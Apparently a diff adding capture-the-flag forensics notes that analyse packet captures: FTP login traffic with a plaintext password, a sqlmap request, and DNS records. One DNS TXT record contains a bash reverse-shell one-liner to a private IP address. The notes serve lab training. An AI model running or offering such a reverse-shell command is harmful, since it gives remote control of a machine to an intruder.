@@ -932,6 +932,91 @@ __cxa_finalize@@GLIBC_2.2.5
 root@kali:~#
 ```
 
+# [Task 12] [Forensics] [Easy] *Sniff* *Sniff*
+## challenge 1
+```
+ftp 
+220 Microsoft FTP Service
+USER garry
+331 Password required for garry.
+PASS n00n3willgu3ssM3
+530 User cannot log in.
+SYST
+215 Windows_NT
+
+http
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Content-Length: 34
+Pragma: no-cache
+Cache-control: no-cache
+Connection: keep-alive
+
+. ......2.......k... .....-(.....-GET /R/A1QKIEJBNTdEODFGNEQzOTQ5MUY5QzY4REE4ODgyODQwQUY4EgQEFwIZGJABIgEAKgcIBBDTruJrMgoIABC7r-JrGIACOICAnJABSICAgID6_____wE= HTTP/1.1
+Host: su.ff.avast.com
+Accept: */*
+Content-Type: application/octet-stream
+Pragma: no-cache
+Connection: keep-alive
+
+static
+conversation
+22
+
+```
+
+## cha2
+```
+GET / HTTP/1.1
+Accept-Encoding: gzip,deflate
+Host: neverssl.com
+Accept: */*
+User-Agent: sqlmap/1.2.10#stable (http://sqlmap.org)
+Connection: close
+Cache-Control: no-cache
+
+udp.stream eq 3
+nT. .........spring.fyi.......)........nT...........spring.fyi..............,.EDgoogle-site-verification=WMBBba98G8g-InYNw_4JYu2QzKc7pV7DD8aNzDBISoM.........,.$#v=spf1 include:_spf.google.com ~all.........,.-,YzYzZGY3ZDcwOTE2MmZjMGM2NmJhODdlNTVlZjkwMGQ=..)........
+
+```
+
+## cha3
+```
+dns
+Frame 2: 134 bytes on wire (1072 bits), 134 bytes captured (1072 bits) on interface en0, id 1
+Ethernet II, Src: Sagemcom_9d:61:0a (d8:7d:7f:9d:61:0a), Dst: Apple_cf:19:37 (98:01:a7:cf:19:37)
+Internet Protocol Version 4, Src: 1.1.1.1, Dst: 192.168.1.164
+User Datagram Protocol, Src Port: 53, Dst Port: 61750
+Domain Name System (response)
+    Transaction ID: 0x4b08
+    Flags: 0x8180 Standard query response, No error
+    Questions: 1
+    Answer RRs: 1
+    Authority RRs: 0
+    Additional RRs: 1
+    Queries
+    Answers
+        altrader.net: type TXT, class IN
+            Name: altrader.net
+            Type: TXT (Text strings) (16)
+            Class: IN (0x0001)
+            Time to live: 202 (3 minutes, 22 seconds)
+            Data length: 39
+            TXT Length: 38
+            TXT: bash -i >& /dev/tcp/172.1.0.43/80 0>&1
+    Additional records
+    [Request In: 1]
+    [Time: 0.017352000 seconds]
+
+port scan
+nmap
+```
+
+## cha4
+```
+```
+
+
 # [Task 17] [Web Exploitation] [Easy] Pickle Rick
 
 
